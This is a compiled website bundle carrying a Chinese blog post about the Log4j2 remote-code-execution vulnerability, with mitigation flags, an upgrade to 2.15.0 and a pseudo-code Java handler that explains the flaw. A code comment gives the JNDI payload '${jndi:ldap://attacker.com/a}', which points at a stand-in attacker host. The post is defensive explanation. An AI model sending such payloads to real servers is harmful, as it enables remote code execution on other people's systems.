"use strict";(self.webpackChunkcoding_road=self.webpackChunkcoding_road||[]).push([[9610],{85196:(n,s,a)=>{a.r(s),a.d(s,{data:()=>e});const e={key:"v-5d00799b",path:"/shigu/log4j2.html",title:"",lang:"zh-CN",frontmatter:{summary:"长话短说吧。 相信大家已经被 Log4j2 的重大漏洞刷屏了，估计有不少小伙伴此时此刻已经累趴下了。很不幸，我的小老弟小二的 Spring Boot 项目中恰好用的就是 Log4j2，版本特喵的还是 2.14.1，在这次漏洞波及的版本范围之内。 第一时间从网上得知这个漏洞的消息后，小二吓尿了。赶紧跑过来问老王怎么解决。 老王先是给小二提供了一些临时性的建议，",head:[["meta",{property:"og:url",content:"https://vuepress-theme-hope-v2-demo.mrhope.site/shigu/log4j2.html"}],["meta",{property:"og:site_name",content:"coding-rode"}],["meta",{property:"og:type",content:"article"}],["meta",{property:"og:updated_time",content:"2022-06-04T07:20:53.000Z"}],["meta",{property:"og:locale",content:"zh-CN"}],["meta",{property:"article:modified_time",content:"2022-06-04T07:20:53.000Z"}]]},excerpt:"",headers:[],git:{createdTime:1653617096e3,updatedTime:1654327253e3,contributors:[{name:"林振辉",email:"linzhenhui@apexsoft.com",commits:2}]},readingTime:{minutes:3.31,words:992},filePathRelative:"shigu/log4j2.md"}},69441:(n,s,a)=>{a.r(s),a.d(s,{default:()=>h});var e=a(95393);const t=(0,e.uE)('<p>长话短说吧。</p><p>相信大家已经被 Log4j2 的重大漏洞刷屏了，估计有不少小伙伴此时此刻已经累趴下了。很不幸，我的小老弟小二的 Spring Boot 项目中恰好用的就是 Log4j2，版本特喵的还是 2.14.1，在这次漏洞波及的版本范围之内。</p><p>第一时间从网上得知这个漏洞的消息后，小二吓尿了。赶紧跑过来问老王怎么解决。</p><p>老王先是给小二提供了一些临时性的建议，比如说：</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>JVM 参数添加 -Dlog4j2.formatMsgNoLookups=true\nlog4j2.formatMsgNoLookups=True\nFORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>并且老王也在时刻的关注着 Log4j2 的官网和 Spring Boot GitHub 仓库的最新消息。</p><p>Java 后端开发的小伙伴应该都知道，Log4j、SLF4J、Logback 这 3 个日志组件是一个爹——Ceki Gulcu，但 Log4j 2 却是例外，它是 Apache 基金会的产品。</p><p>所以这波超级高危漏洞的锅必须得由 Apache 来背。并且波及范围非常广，已知受影响的应用程序和组件有：</p><ul><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><p>并且只要是在 Log4j 2.x &lt;= 2.14.1 之间的版本，都将受到影响——注定被载入史册的一波 bug 啊。</p><p>目前，Log4j2 的官网已经发布了 Log4j2 2.15.0 正式版，来解决此次漏洞。</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-01.png" alt="" loading="lazy"></p><p>那随着 Log4j2 2.15.0 正式版的发布，Spring Boot 的 GitHub 仓库提的这些关于 Log4j2 的 issue 都已经处于关闭状态了。</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-02.png" alt="" loading="lazy"></p><p>看到这些消息后，老王紧张的情绪一下子就缓解了下来，就像吃了一颗定心丸，赶紧去通知小二不用再提心吊胆了，直接一行代码搞定。</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;properties&gt;\n    &lt;log4j2.version&gt;2.15.0&lt;/log4j2.version&gt;\n&lt;/properties&gt;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>详情可参照 Spring Boot 官方这篇博客：</p>',17),p={href:"https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot",target:"_blank",rel:"noopener noreferrer"},o=(0,e.Uk)("https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot"),l=(0,e.uE)('<p>Gradle 构建的项目也有解决方案。</p><p><img src="http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-03.png" alt="" loading="lazy"></p><p>问题是解决了，不过老王没闲着。他从 Log4j2 官网公布的最新消息中琢磨出，本次远程代码执行漏洞正是由于组件存在 Java JNDI 注入漏洞：<strong>当程序将用户输入的数据记录到日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码</strong>。</p><p>那肯定会有小伙伴在好奇 JNDI 是什么东东？来看一下维基百科的解释。</p><blockquote><p>Java 命名和目录接口（Java Naming and Directory Interface，缩写 JNDI），是 Java 的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p></blockquote><p>利用下面这段代码，攻击者可以通过 JNDI 来执行 LDAP 协议来注入一些非法的可执行代码。</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VulnerableLog4jExampleHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">{</span>\n    <span class="token keyword">static</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">Logger</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4jExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token doc-comment comment">/**\n     * A simple HTTP endpoint that reads the request&#39;s User Agent and logs it back.\n     *\n     * This is basically pseudo-code to explain the vulnerability, and not a full example.\n     *\n     * <span class="token keyword">@param</span> <span class="token parameter">he</span> HTTP Request Object\n     */</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">HttpExchange</span> he<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>\n        <span class="token class-name">String</span> userAgent <span class="token operator">=</span> he<span class="token punctuation">.</span><span class="token function">getRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;user-agent&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span>\n<span class="token comment">// The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}</span>\n        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&quot;Request User Agent:&quot;</span> <span class="token operator">+</span> userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> response <span class="token operator">=</span> <span class="token string">&quot;&lt;h1&gt;Hello There, &quot;</span> <span class="token operator">+</span> userAgent <span class="token operator">+</span> <span class="token string">&quot;!&lt;/h1&gt;&quot;</span><span class="token punctuation">;</span>\n        he<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> he<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体的攻击手段可以参考这里：</p>',8),c={href:"https://github.com/apache/pulsar/issues/13232",target:"_blank",rel:"noopener noreferrer"},i=(0,e.Uk)("https://github.com/apache/pulsar/issues/13232"),r=(0,e._)("p",null,"下图是程序猿阿朗画的简单的攻击链路步骤图。",-1),u=(0,e._)("p",null,[(0,e._)("img",{src:"http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-04.png",alt:"",loading:"lazy"})],-1),g=(0,e._)("p",null,[(0,e.Uk)("感兴趣的小伙伴可以在本地复现一下，但"),(0,e._)("strong",null,"千万不要不当利用"),(0,e.Uk)("哦！")],-1),d=(0,e._)("p",null,[(0,e._)("img",{src:"http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-05.png",alt:"",loading:"lazy"})],-1),k=(0,e._)("p",null,"再次提醒大家一下，排查自己的项目是否引入了 Apache log4j-core Jar 包。",-1),m=(0,e._)("p",null,[(0,e._)("img",{src:"http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/shigu/log4j2-06.png",alt:"",loading:"lazy"})],-1),v=(0,e._)("p",null,"如果存在依赖引入，且在受影响版本范围内，请升级到 Apache Log4j2 2.15.0 版本，目前已经 release。",-1),b={},h=(0,a(13860).Z)(b,[["render",function(n,s){const a=(0,e.up)("ExternalLinkIcon");return(0,e.wg)(),(0,e.iD)("div",null,[t,(0,e._)("blockquote",null,[(0,e._)("p",null,[(0,e._)("a",p,[o,(0,e.Wm)(a)])])]),l,(0,e._)("blockquote",null,[(0,e._)("p",null,[(0,e._)("a",c,[i,(0,e.Wm)(a)])])]),r,u,g,d,k,m,v])}]])},13860:(n,s)=>{s.Z=(n,s)=>{const a=n.__vccOpts||n;for(const[n,e]of s)a[n]=e;return a}}}]);